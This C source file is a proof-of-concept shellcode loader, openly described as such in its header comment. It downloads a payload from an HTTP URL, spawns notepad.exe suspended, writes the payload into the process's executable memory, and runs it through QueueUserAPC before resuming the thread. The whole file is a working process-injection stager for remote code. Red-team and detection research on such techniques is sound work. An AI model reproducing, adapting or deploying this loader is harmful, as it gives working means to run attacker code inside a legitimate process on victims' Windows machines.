#include <stdio.h>
#include <Windows.h>
#include <wininet.h>
#include "Core.h"

#pragma comment(lib, "wininet.lib")

/*
Something quick I threw together. Not meant for AV/EDR evasion at all.
Directly invokes Windows APIs and is a POC. Yes it's bad.
*/

BOOL downloadPayload(PBYTE* pPayload, SIZE_T* pSizeofPayload)
{
    /*-------------[Variable Initialization]-----------------------*/
    HANDLE ih             = NULL;   // Internet handle 1
    HANDLE ih2            = NULL;   // Internet handle 2
    SIZE_T totalSize      = NULL;   // Total accumulated size
    PBYTE  payloadBuffer  = NULL;   // Total payload buffer
    DWORD  numBytesRead   = NULL;   // Will hold number of bytes read in ReadFile call
    PBYTE  tmpBuffer      = NULL;   // Will read internet file in chunks of 1024 bytes

    /*-------------[Initialize WinInet]----------------------------*/
    ih = InternetOpenW(L"Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (ih == NULL)
    {
        err("Failed to initialize WinInet with error code %d", GetLastError());
        goto _CLEANUP;
    }

    /*-------------[Open Internet Resource]------------------------*/
    ih2 = InternetOpenUrlW(ih, L"http://127.0.0.1/payload.bin", 0, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (ih2 == NULL)
    {
        err("Failed to initialize use of WinINet functions with error code %d", GetLastError());
        goto _CLEANUP;
    }

    /*-------------[Read Internet Resource Infinite Loop]----------*/
    tmpBuffer = (PBYTE)LocalAlloc(LPTR, MAX_SIZE);
    if (tmpBuffer == NULL)
    {
        err("Failed to allocate temporary buffer.");
        goto _CLEANUP;
    }
    
    while (TRUE) 
    {
        // Read 1024 bytes to the temp buffer
        if (!InternetReadFile(ih2, tmpBuffer, MAX_SIZE, &numBytesRead))
        {
            err("Failed to read internet file. Failed with error %d", GetLastError());
            goto _CLEANUP;
        }

        // Update size of total buffer 
        totalSize += numBytesRead;

        // Check to see if payloadBuffer is already allocated
        if (payloadBuffer == NULL)
        {
            payloadBuffer = (PBYTE)LocalAlloc(LPTR, numBytesRead);
        }
        else
        {
            payloadBuffer = (PBYTE)LocalReAlloc(payloadBuffer, totalSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (payloadBuffer == NULL)
        {
            err("Failed to allocate payload buffer. Last error: %d", GetLastError());
            goto _CLEANUP;
        }

        // Copying 1024 bytes to memory allocated for payload
        memcpy((PBYTE)(payloadBuffer + (totalSize - numBytesRead)), tmpBuffer, numBytesRead);

        // tmpBuffer cleanup
        memset(tmpBuffer, '\0', numBytesRead);

        // If less than 1024 bytes read than we've reached the end of our payload
        // Updates size of payload
        if (numBytesRead < MAX_SIZE)
        {
            *pPayload = payloadBuffer;
            *pSizeofPayload = totalSize;
            break;
        }
    }

_CLEANUP:
    if (ih)
    {
        InternetCloseHandle(ih);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    }
    
    if (ih2)
    {
        InternetCloseHandle(ih2);
    }

    if (tmpBuffer)
    {
        LocalFree(tmpBuffer);
    }

    return TRUE;
}

int main()  
{
    /*-------------[Variable initialization]---------------------*/
    PBYTE                tmpPayload         = NULL;
    LPVOID               pPayload           = NULL;
    SIZE_T               sizeOfPayload      = NULL;
    SIZE_T               bytesWritten       = NULL;
    STARTUPINFO          si                 = { 0 };
    PROCESS_INFORMATION  pi                 = { 0 };
    HANDLE               hProcess           = NULL;
    HANDLE               hThread            = NULL;

    // Set up si with size of struct
    si.cb = sizeof(STARTUPINFO);

    // Creating notepad.exe process in suspended format
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        err("Failed to create notepad process. Failed with error code %d", GetLastError());
        return FALSE;
    }
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    ok("Spawned notepad process. Press [Enter] to continue...");
    getchar();

    // Downloading payload into temporary buffer
    downloadPayload(&tmpPayload, &sizeOfPayload);

    ok("Payload downloaded from remote server. Press [Enter] to continue...");
    getchar();

    // Allocating virtual memory
    pPayload = VirtualAllocEx(hProcess, NULL, sizeOfPayload, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pPayload == NULL)
    {
        err("Failed to allocate virtual memory in remote process. Last known error: %d", GetLastError());
        return -1;
    }

    // WriteProcessMemory to write downloaded payload to mem allocated in process
    if (!WriteProcessMemory(hProcess, pPayload, tmpPayload, sizeOfPayload, &bytesWritten))
    {
        err("Failed call to WriteProcessMemory.");
        return -1;
    }

    ok("Memory written to remote process. Bytes written : %d", bytesWritten);

    // Queuing thread for execution
    if (!QueueUserAPC((PTHREAD_START_ROUTINE)pPayload, hThread, NULL))
    {
        err("Failed to Queue user APC.");
        return -1;
    }

    ok("Thread is queued and ready for execution. Press [Enter] to resume thread...");
    getchar();

    ResumeThread(hThread);
    
    return 0;
}